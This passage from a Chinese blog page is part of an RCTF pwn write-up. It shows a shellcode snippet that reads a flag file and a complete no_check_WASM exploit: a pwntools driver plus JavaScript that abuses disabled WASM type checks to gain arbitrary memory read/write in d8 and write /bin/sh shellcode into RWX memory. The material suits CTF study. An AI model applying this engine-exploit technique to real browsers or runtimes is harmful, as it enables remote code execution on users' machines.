+    s(asm('nop;'*0x40+'lea rsp, [rip+0x800];' + shellcraft.open('flag', 0, 0) + shellcraft.read('rax', 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100)))
+
+pwn()
+p.interactive()
+</code></pre>
+<h1 id="no_check_wasm">no_check_WASM</h1>
+<p>本题取消了<code>wasm</code>的类型保护检查。</p>
+<p>用<code>externStructRef</code>自己做一个结构体就能随便任意读写了</p>
+<p>然后就是找<code>rwx</code>写<code>rwx</code>。<code>wasm</code>在预热以后能从它的栈内存里泄漏栈地址（猜测，总之是拿到了地址）</p>
+<p>然后就写<code>shellcode</code>我的脚本是概率通，嗯。</p>
+<pre><code class="language-python">from pwn import *
+import hashlib
+import sys
+import itertools
+import string
+
+def solve(h):
+    if isinstance(h, bytes): h = h.decode().strip()
+    cmd = ["hashcat", "-m", "1400", "-a", "3", "--quiet", "--potfile-disable", "--outfile-format=2", h, "rctf?h?h?h?h?h?h"]
+    return subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode().strip()[4:].encode()
+            
+filename = './d8'
+# libc = ELF("./libc.so.6")
+host= '127.0.0.1'
+port= 7000
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process(filename)
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process(filename)
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+'''
+def pwn():
+    global p
+    p = getp()
+    p.recvuntil('Find a nonce such that SHA-256(\'rctf\' + nonce) == ')
+    hash = p.recvline(keepends=False)
+    nonce = solve(hash)
+    sa('nonce:', nonce)
+    with open('./1.js') as f:
+        js = f.read()
+        sla('size', str(len(js)))
+        sla('script', js)
+
+pwn()
+p.interactive()
+</code></pre>
+<pre><code class="language-javascript">///// ------------------ wasm-module-builder.js END -------------------- /////
+
+var foo = ()=&gt;
+{
+    return [1.0,
+        1.95538254221075331056310651818E-246,
+        1.95606125582421466942709801013E-246,
+        1.99957147195425773436923756715E-246,
+        1.95337673326740932133292175341E-246,
+        2.63486047652296056448306022844E-284];
+}
+for (let i = 0; i &lt; 0x10000; i++) {
+    foo();foo();foo();foo();
+} 
+// Helper
+var _b = new ArrayBuffer(16);
+var _f = new Float64Array(_b);
+var _i = new BigUint64Array(_b);
+function f2i(f)
+{
+	_f[0] = f;
+	return _i[0];
+}
+function i2f(i)
+{
+	_i[0] = i;
+	return _f[0];
+}
+function hex(i)
+{
+	print("0x"+i.toString(16).padStart(16,"0"));
+}
+
+function addr_of(obj)
+{
+    const builder = new WasmModuleBuilder();
+    const sig_i = makeSig([kWasmExternRef], [kWasmI64]);
+
+    builder.addFunction("addr", sig_i)
+    .exportFunc()
+    .addBody([
+        kExprLocalGet, 0,
+    ]);
+    const instance = builder.instantiate();
+    const addr = instance.exports.addr;
+    return addr(obj);
+}
+
+function fake_obj(addr)
+{
+    const builder = new WasmModuleBuilder();
+    const sig_i = makeSig([kWAsmI64], [kWasmExternRef]);
+
+    builder.addFunction("fake", sig_i)
+    .exportFunc()
+    .addBody([
+        kExprLocalGet, 0,
+    ]);
+
+    const instance = builder.instantiate();
+    const fake = instance.exports.fake;
+    return fake(addr);
+}
+
+function buildConfuseFunction(addr)
+{
+    const builder = new WasmModuleBuilder();
+
+    const filed_i64 = makeField(kWasmI64, true);
+    const structType = builder.addStruct([filed_i64], kNoSuperType, true, false);
+    const refStructType = wasmRefType(structType)
+
+    const sig_i = makeSig([kWasmI64], [refStructType]);
+    cast = builder.addFunction("i64_to_struct", sig_i)
+    .exportFunc()
+    .addBody([
+        kExprLocalGet, 0,
+    ]);
+
+    const sig_j = makeSig([kWasmI64], [kWasmI64]);
+    builder.addFunction("_read64", sig_j)
+    .exportFunc()
+    .addBody([
+        kExprLocalGet, 0,
+        kExprCallFunction, ...wasmUnsignedLeb(cast.index, kMaxVarInt32Size),
+        kGCPrefix, kExprStructGet, 
+        ...wasmUnsignedLeb(structType, kMaxVarInt32Size), 
+        ...wasmUnsignedLeb(0, kMaxVarInt32Size),
+    ]);
+
+    const sig_k = makeSig([kWasmI64, kWasmI64], []);
+    builder.addFunction("_write64", sig_k)
+    .exportFunc()
+    .addBody([
+        kExprLocalGet, 0,
+        kExprCallFunction, ...wasmUnsignedLeb(cast.index, kMaxVarInt32Size),
+        kExprLocalGet, 1,
+        kGCPrefix, kExprStructSet, 
+        ...wasmUnsignedLeb(structType, kMaxVarInt32Size), 
+        ...wasmUnsignedLeb(0, kMaxVarInt32Size),
+
+    ]);
+
+    const instance = builder.instantiate();
+    return instance.exports;
+}
+
+function read64(addr)
+{
+    return buildConfuseFunction()._read64(addr);
+}
+
+function write64(addr, value)
+{
+    return buildConfuseFunction()._write64(addr, value);
+}
+
+function leak_stack()
+{
+    const builder = new WasmModuleBuilder();
+    const sig_i = makeSig([], [kWasmI64, kWasmI64, kWasmF64, kWasmF64]);
+
+    builder.addFunction("leak", sig_i)
+    .exportFunc()
+    .addBodyWithEnd([
+        kExprEnd,
+    ]);
+
+  const module_bytes = builder.toBuffer();
+  const mod = new WebAssembly.Module(module_bytes);
+  const instance = new WebAssembly.Instance(mod, {});
+  var ret_val = instance.exports.leak();
+  return ret_val;
+}
+darry = [1.1, 1.2, 1.3];
+x = addr_of([foo]);
+y = read64(x);
+for(i = 0; i &lt; 1000; i++)
+{
+    var sth = leak_stack();
+}
+sth = leak_stack();
+stack = f2i(sth[2]);
+for(i = 0n; i &lt; 100n; i++)
+{
+    rwx = read64(stack + i * 8n + 1n);
+    // hex(rwx);
+}
+
+sh = [
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x9090909090909090n,
+0x6e69622fb848686an,
+0xe7894850732f2f2fn,
+0x2434810101697268n,
+0x6a56f63101010101n,
+0x894856e601485e08n,
+0x50f583b6ad231e6n,
+0xccccccccccccccccn,
+0xfffffe57e9909090n,
+];
+
+rwx = read64(stack + 0x51n);
+hex(rwx)
+hex(stack);
+hex(x);
+hex(y);
+print(y);
+
+for(i = 1n; i &lt; 100n; i++)
+{
+    if(i &lt; 0x34)
+        write64(rwx + i * 8n + 0n, sh[i]);
+}
+</code></pre>
+<h1 id="bbox">BBOX</h1>
+<p>没学过qemu逃逸，期中考完学一下</p>
+
+
+</div>
+<div class="clear"></div>
+<div id="blog_post_info_block" role="contentinfo" class="post-meta-container">
+    <div id="blog_post_info"></div>
+    <div class="clear"></div>
+    <div id="post_next_prev"></div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2025-11-22 00:22">2025-11-22 00:21</span>&nbsp;
+<a href="https://www.cnblogs.com/undefined">imiab</a>&nbsp;
+阅读(<span id="post_view_count">238</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(19254887);return false;">收藏</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fundefined%2Fp%2F19254887&targetId=19254887&targetType=0" target="_blank">举报</a>
+</div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+<script>
+    var cb_entryId = 19254887, cb_entryCreatedDate = '2025-11-22 00:21', cb_postType = 1, cb_postTitle = 'RCTF pwn方向题解（缺bbox）';
+    var allowComments = true, cb_blogId = 841504, cb_blogApp = 'undefined', cb_blogUserGuid = '8a0895b2-d2a5-4d98-c91d-08dd08913576';
+    mermaidRender.render()
+    markdown_highlight()
+    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");    
+</script>
+<a id="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav">
+        <div class="comment-nav-right">
+            <span id="span_refresh_tips"></span><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a>
+        </div>
+    </div>
+    <div id="comment_form_container"></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+        <div id="cnblogs_ch"></div>
+    <div id="opt_under_post"></div>
+        <div id="blog_c1" class="under-post-card below-post-card">
+            <a href="https://www.doubao.com/download/desktop?ug_apk_token=FxCjd" rel="nofollow" target="_blank" onclick="countCreativeClicks('C1-字节-豆包')">
+                <img src="https://img2024.cnblogs.com/blog/35695/202609/35695-20260905201441417-1701437871.webp" onload="countCreativeImpressions('C1-字节-豆包')" alt="" style="width:300px!important;height:250px!important;min-width:300px!important;max-width:300px!important;" />
+                <span id="c1_impression" style="display:none"></span>
+            </a>
+        </div>
+    <div id="under_post_card1"></div>
+    <div id="related_posts_card"></div>
+    <div id="under_post_card2"></div>
+    <div id="HistoryToday" class="under-post-card below-post-card"></div>
+    <script type="text/javascript">
+        var commentManager = new blogCommentManager();
+        commentManager.renderComments(0);
+        fixPostBody();
+        window.footnoteTipManager.generateFootnoteTips();
+
+            window.tocManager.displayDisableTocTips = false;
+            window.tocManager.generateToc();
+            
+            setTimeout(function() { countViews(cb_blogId, cb_entryId); }, 50);
+            
+            deliverT2();
+            deliverC1C2();
+            loadNewsAndKb();
+            
+            LoadPostCategoriesTags(cb_blogId, cb_entryId);
+            
+            LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+            GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+            loadOptUnderPost();
+            GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+                </script>
+</div>
+
+	</div>
+	</div>
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div>
+					<script>loadBlogSideColumn()</script>
+			</div>			
+		</div>
+	</div>
+	<div class="clear"></div>
+	</div>
+	<div class="clear"></div>
+	<div id="footer">
+		<a href="https://www.cnblogs.com/" id="footer_site_link" class="footer-brand">博客园</a>
+<span class="footer-copyright"> &nbsp;&copy;&nbsp; 2004-2026</span>
+<br /><span class="footer-icp">
+    <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602011771"><img src="//assets.cnblogs.com/images/ghs.png" />浙公网安备 33010602011771号</a>
+    <a href="https://beian.miit.gov.cn" target="_blank">浙ICP备2021040463号-3</a>
+</span>
+
+
+
+	</div>
+</div>
+
+
+
+    <div id="page_end_html">
+        <script src="https://cdn.cnblogs.com/awescnb/index.js"></script>
+<script>
+  const opts = {
+    bodyBackground: {
+        enable: true,
+        value:'https://images.cnblogs.com/cnblogs_com/blogs/841504/galleries/2448994/o_250312133253_meiying.jpg',
+        opacity: 0.85,
+        repeat: true,
+    },
+    theme: {
+      name: 'geek',
+      avatar:'https://images.cnblogs.com/cnblogs_com/blogs/841504/galleries/2448994/o_250312125116_QQ%E5%9B%BE%E7%89%8720240807015716.jpg',
+    },
+    darkMode: {
+        enable: true,
+        darkDefault: false,
+    },
+  signature: {
+      enable: false,
+      contents: [
+      "",
+      ],
+    },
+  }
+  $.awesCnb(opts)
+</script>
+    </div>
+
+    <input type="hidden" id="antiforgery_token" value="CfDJ8Ow5-In01nBEvFwaadRGjqHW2Kf9SHXZZbXw_Dvs1kB1zfiklbIWkGpQkaSgSOF5Mh1pVQRaGarcQzz65TgR9oaVmU228K4BGalfchLu8O80ymYAtCu5c2LqBtQVB6sSA7P0zRFlGI3w2ppgEuR0OoM" />
+    <script defer src="https://hm.baidu.com/hm.js?866c9be12d4a814454792b1fd0fed295"></script>
+<script defer src="https://lf1-cdn-tos.bytegoofy.com/goofy/ttzz/push.js?32d945448dd797af605da9156763de3dc11c9886368d0f917d6388e4fcf5542030632485602430134f60bc55ca391050b680e2741bf7233a8f1da9902314a3fa" id="ttzz"></script>
+</body>
+</html>
